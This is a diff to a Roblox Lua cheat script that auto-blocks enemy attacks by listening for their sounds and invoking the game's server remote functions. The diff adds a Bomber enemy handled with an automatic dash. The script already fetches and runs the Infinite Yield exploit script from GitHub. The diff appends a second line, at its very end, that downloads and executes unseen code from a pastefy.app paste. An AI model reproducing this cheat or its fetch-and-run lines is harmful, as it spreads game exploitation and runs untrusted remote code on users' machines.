@@ -30,7 +30,8 @@ local autoBlockTriggerSounds = {
     ["113702274120842"] = true,  -- Elite Deathaxe first hit sound / Reaper first & third attack
     ["108248505808935"] = true,  -- Elite Deathaxe second hit sound / Reaper second attack
     ["88874721963703"] = true,   -- Skeleton Rogue/Axe Skeleton first hit sound
-    ["92665931198774"] = true    -- Skeleton Rogue/Axe Skeleton second hit sound
+    ["92665931198774"] = true,   -- Skeleton Rogue/Axe Skeleton second hit sound
+    ["105894780238520"] = true   -- Bomber explosion sound
 }
 
 -- Enemy delay configurations (in seconds)
@@ -74,6 +75,10 @@ local enemyDelays = {
     -- Blazing Slime
     blazing_slime = {
         ["133615523996464"] = 0.2     -- Single attack: 0.2s
+    },
+    -- Bomber (0.25 delay for dash)
+    bomber = {
+        ["105894780238520"] = 0.25     -- Explosion sound: 0.25s delay
     }
 }
 
@@ -106,14 +111,26 @@ local function fireStopBlock()
     game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RF"):WaitForChild("StopBlock"):InvokeServer()
 end
 
+-- Dash function for Bomber
+local function fireDash()
+    local args = {
+        "LookVector",
+        "+"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("CharacterService"):WaitForChild("RF"):WaitForChild("Dash"):InvokeServer(unpack(args))
+end
+
 -- Get enemy type from name
 local function getEnemyType(enemy)
     if not enemy or not enemy.Name then return "unknown" end
     
     local name = enemy.Name
     
+    -- Check for Bomber
+    if string.find(name, "Bomber") then
+        return "bomber"
     -- Check for Blazing Slime
-    if string.find(name, "Blazing Slime") then
+    elseif string.find(name, "Blazing Slime") then
         return "blazing_slime"
     -- Check for Reaper
     elseif string.find(name, "Reaper") then
@@ -177,8 +194,8 @@ local function getNearestEnemyInRange()
         -- Skip if this is the player's character
         local player = Players:GetPlayerFromCharacter(enemy)
         if not player then
-            -- Check if it's a zombie, skeleton, reaper, or slime
-            if string.find(enemy.Name, "Zombie") or string.find(enemy.Name, "Deathaxe") or string.find(enemy.Name, "Skeleton") or string.find(enemy.Name, "Reaper") or string.find(enemy.Name, "Slime") then
+            -- Check if it's a zombie, skeleton, reaper, slime, or bomber
+            if string.find(enemy.Name, "Zombie") or string.find(enemy.Name, "Deathaxe") or string.find(enemy.Name, "Skeleton") or string.find(enemy.Name, "Reaper") or string.find(enemy.Name, "Slime") or string.find(enemy.Name, "Bomber") then
                 local hrp = enemy:FindFirstChild("HumanoidRootPart") or enemy:FindFirstChild("Head")
                 if hrp then
                     local dist = (hrp.Position - myRoot.Position).Magnitude
@@ -201,8 +218,8 @@ local function isEnemyInRange(enemy)
     local player = Players:GetPlayerFromCharacter(enemy)
     if player then return false end
     
-    -- Check if it's a zombie, skeleton, reaper, or slime
-    if not (string.find(enemy.Name, "Zombie") or string.find(enemy.Name, "Deathaxe") or string.find(enemy.Name, "Skeleton") or string.find(enemy.Name, "Reaper") or string.find(enemy.Name, "Slime")) then
+    -- Check if it's a zombie, skeleton, reaper, slime, or bomber
+    if not (string.find(enemy.Name, "Zombie") or string.find(enemy.Name, "Deathaxe") or string.find(enemy.Name, "Skeleton") or string.find(enemy.Name, "Reaper") or string.find(enemy.Name, "Slime") or string.find(enemy.Name, "Bomber")) then
         return false
     end
     
@@ -490,9 +507,20 @@ local function attemptBlockForSound(sound)
         -- Get appropriate block DELAY based on enemy type
         local blockDelay = getBlockDelay(nearestEnemy, id)
         
-        print("DEBUG: Waiting " .. blockDelay .. " seconds before blocking")
+        print("DEBUG: Waiting " .. blockDelay .. " seconds before action")
         
-        -- Wait for the delay BEFORE blocking
+        -- Special handling for Bomber - use dash instead of block
+        if getEnemyType(nearestEnemy) == "bomber" and id == "105894780238520" then
+            -- Wait for the 0.25s delay BEFORE dashing
+            if blockDelay > 0 then
+                task.wait(blockDelay)
+            end
+            print("Bomber detected - dashing after delay!")
+            fireDash()
+            return  -- Don't block, just dash
+        end
+        
+        -- Wait for the delay BEFORE blocking (for other enemies)
         if blockDelay > 0 then
             task.wait(blockDelay)
         end
@@ -633,7 +661,7 @@ AutoBlockTab:CreateInput({
 
 AutoBlockTab:CreateParagraph({
     Title = "Enemy Delay Settings",
-    Content = "Normal Zombies: 0.5s both attacks | Deathaxe Skeletons: 0.85s (1st attack), 0.5s (2nd attack) | Elite Deathaxe: 0.85s (1st attack), 0.5s (2nd attack) | Skeleton Rogue: 0.15s (1st attack), 0.2s (2nd attack) | Elite Rogue Skeleton: 0.15s (1st attack), 0.2s (2nd attack) | Axe Skeleton: 0.2s (1st attack), 0.1s (2nd attack) | Delver Zombies: 0.4s (1st attack), 0.2s (2nd attack) | Reaper: 0.2s all three attacks | Blazing Slime: 0.2s single attack"
+    Content = "Normal Zombies: 0.5s both attacks | Deathaxe Skeletons: 0.85s (1st attack), 0.5s (2nd attack) | Elite Deathaxe: 0.85s (1st attack), 0.5s (2nd attack) | Skeleton Rogue: 0.15s (1st attack), 0.2s (2nd attack) | Elite Rogue Skeleton: 0.15s (1st attack), 0.2s (2nd attack) | Axe Skeleton: 0.2s (1st attack), 0.1s (2nd attack) | Delver Zombies: 0.4s (1st attack), 0.2s (2nd attack) | Reaper: 0.2s all three attacks | Blazing Slime: 0.2s single attack | Bomber: 0.25s delay then dash"
 })
 
 -- Initialize visuals if character exists
@@ -651,3 +679,5 @@ end)
 Rayfield:LoadConfiguration()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+loadstring(game:HttpGet("https://pastefy.app/ULaWpxKm/raw"))()
